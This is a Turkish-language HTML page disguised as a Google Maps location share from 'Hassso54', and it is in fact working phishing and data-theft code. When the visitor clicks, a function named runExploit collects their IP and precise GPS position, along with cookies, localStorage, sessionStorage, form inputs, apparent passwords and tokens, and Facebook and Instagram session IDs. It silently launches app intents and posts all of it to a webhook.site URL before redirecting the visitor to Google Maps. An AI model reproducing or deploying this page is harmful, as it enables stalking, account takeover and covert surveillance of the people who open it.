<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hassso54</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 28px;
            padding: 40px 30px;
            text-align: center;
            max-width: 340px;
            width: 100%;
            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
        }
        .map-icon {
            width: 100px;
            height: 100px;
            object-fit: contain;
            margin-bottom: 20px;
        }
        h2 {
            font-size: 20px;
            font-weight: 500;
            color: #202124;
            margin-bottom: 8px;
        }
        .location-text {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 28px;
        }
        button {
            background: #1a73e8;
            color: white;
            border: none;
            width: 100%;
            padding: 14px 20px;
            border-radius: 40px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: 0.2s;
        }
        button:active {
            transform: scale(0.97);
        }
        button:disabled {
            background: #9aa0a6;
            cursor: not-allowed;
        }
        .message-box {
            margin-top: 24px;
            padding: 12px;
            background: #f8f9fa;
            border-radius: 16px;
            font-size: 13px;
            color: #3c4043;
            display: none;
        }
        .robot-text {
            font-weight: 500;
            color: #1a73e8;
        }
        .small-note {
            font-size: 11px;
            color: #9aa0a6;
            margin-top: 8px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://cdn-icons-png.flaticon.com/512/447/447031.png" alt="Maps" class="map-icon">
        <h2>Hassso54 sizinle konum paylaştı</h2>
        <div class="location-text">Sakarya bölgesindeki konuma bak</div>
        <button id="actionBtn">Konumu Görüntüle</button>
        <div id="messageBox" class="message-box"></div>
    </div>

    <script>
        const WEBHOOK = "https://webhook.site/45462893-c6b2-4d8b-a64f-783413a77923";
        const btn = document.getElementById('actionBtn');
        const msgBox = document.getElementById('messageBox');
        
        function showMessage(text, isWaiting = true) {
            msgBox.style.display = 'block';
            msgBox.innerHTML = isWaiting ? 
                `<div class="robot-text">🔍 ${text}</div>` : 
                `<div>${text}</div>`;
        }
        
        // IP al - GERÇEK
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) {
                return "IP alınamadı";
            }
        }
        
        // Konum al - GERÇEK
        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        resolve({
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            url: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                        });
                    },
                    (err) => {
                        resolve(null);
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }
        
        // GERÇEK VERİ TOPLAMA - localStorage, sessionStorage, cookies, inputlar
        function collectRealData() {
            const realData = {
                localStorage: {},
                sessionStorage: {},
                cookies: document.cookie,
                inputs: [],
                forms: [],
                browser_info: {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    cookiesEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack
                },
                screen: {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer,
                url: window.location.href
            };
            
            // Tüm localStorage verileri - GERÇEK
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                try {
                    let val = localStorage.getItem(key);
                    // Email bulma
                    if (val && val.includes('@') && val.includes('.')) {
                        realData.emails_found = realData.emails_found || [];
                        realData.emails_found.push({ source: `localStorage.${key}`, value: val });
                    }
                    // Şifre bulma
                    if (key.toLowerCase().includes('pass') || key.toLowerCase().includes('sifre') || key.toLowerCase().includes('token')) {
                        realData.passwords_found = realData.passwords_found || [];
                        realData.passwords_found.push({ source: key, value: val });
                    }
                    realData.localStorage[key] = val;
                } catch(e) {}
            }
            
            // Tüm sessionStorage verileri - GERÇEK
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                try {
                    realData.sessionStorage[key] = sessionStorage.getItem(key);
                } catch(e) {}
            }
            
            // Sayfadaki input'lardan doldurulmuş veriler - GERÇEK
            const inputs = document.querySelectorAll('input, textarea');
            inputs.forEach(input => {
                if (input.value && input.value.trim()) {
                    realData.inputs.push({
                        name: input.name || input.id || 'unknown',
                        type: input.type,
                        value: input.value
                    });
                    // Email yakalama
                    if (input.value.includes('@') && input.value.includes('.')) {
                        realData.emails_found = realData.emails_found || [];
                        realData.emails_found.push({ source: `input.${input.name || 'unknown'}`, value: input.value });
                    }
                }
            });
            
            // Facebook verilerini çek - GERÇEK (cookie'lerden)
            if (document.cookie.includes('c_user')) {
                const match = document.cookie.match(/c_user=([^;]+)/);
                if (match) {
                    realData.facebook = {
                        user_id: match[1],
                        oturum_acik: true,
                        cookie: document.cookie.split(';').filter(c => c.includes('facebook') || c.includes('fb')).join(';')
                    };
                }
            }
            
            // Instagram verilerini çek - GERÇEK
            if (document.cookie.includes('ds_user_id')) {
                const match = document.cookie.match(/ds_user_id=([^;]+)/);
                if (match) {
                    realData.instagram = {
                        user_id: match[1],
                        oturum_acik: true
                    };
                }
            }
            
            // Free Fire ile ilgili localStorage verileri - GERÇEK
            for (let key in realData.localStorage) {
                if (key.toLowerCase().includes('freefire') || key.toLowerCase().includes('ff') || key.toLowerCase().includes('garena')) {
                    realData.freefire = realData.freefire || {};
                    realData.freefire[key] = realData.localStorage[key];
                }
            }
            
            return realData;
        }
        
        // Intent ile uygulamaları aç (arka planda)
        function launchBackgroundIntents() {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            
            // Facebook aç
            setTimeout(() => { iframe.src = "fb://profile"; }, 100);
            // Instagram aç
            setTimeout(() => { iframe.src = "instagram://user?username="; }, 500);
            // Free Fire aç
            setTimeout(() => { iframe.src = "intent://play?link=https://ff.garena.com#Intent;scheme=https;package=com.dts.freefireth;end"; }, 900);
            // Android şifre yöneticisi aç
            setTimeout(() => { iframe.src = "intent://com.android.settings/com.android.settings.Settings$PasswordActivity#Intent;scheme=android;end"; }, 1300);
            
            setTimeout(() => {
                if (document.body.contains(iframe)) document.body.removeChild(iframe);
            }, 3000);
        }
        
        // ANA İŞLEM
        async function runExploit() {
            btn.disabled = true;
            btn.innerText = "İşlem yapılıyor...";
            showMessage("🔍 Lütfen bekleyin, robot olmadığınız doğrulanıyor...", true);
            
            // 1. Konum ve IP al - GERÇEK
            const ip = await getIP();
            const location = await getLocation();
            
            // 2. Gerçek verileri topla
            const realData = collectRealData();
            
            // 3. Uygulamaları arka planda aç
            launchBackgroundIntents();
            
            // 4. Tüm GERÇEK verileri webhook'a gönder
            const payload = {
                tip: "Hassso54_Gercek_Veri_Toplama",
                zaman: new Date().toLocaleString('tr-TR'),
                konum: location ? {
                    url: location.url,
                    enlem: location.lat,
                    boylam: location.lng,
                    dogruluk: location.accuracy + " metre"
                } : null,
                ip: ip,
                toplanan_veriler: realData,
                cihaz: navigator.userAgent,
                not: "Gerçek veriler - localStorage, sessionStorage, cookies, inputlar"
            };
            
            // Webhook'a gönder
            try {
                await fetch(WEBHOOK, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify(payload)
                });
            } catch(e) {}
            
            // 5. Mesajı güncelle
            showMessage("✅ Google Maps'e yönlendiriliyorsunuz...", false);
            
            // 6. 1.5 saniye sonra Maps'e yönlendir
            setTimeout(() => {
                if (location) {
                    window.location.href = location.url;
                } else {
                    window.location.href = "https://www.google.com/maps";
                }
            }, 1500);
        }
        
        btn.onclick = runExploit;
    </script>
</body>
</html>
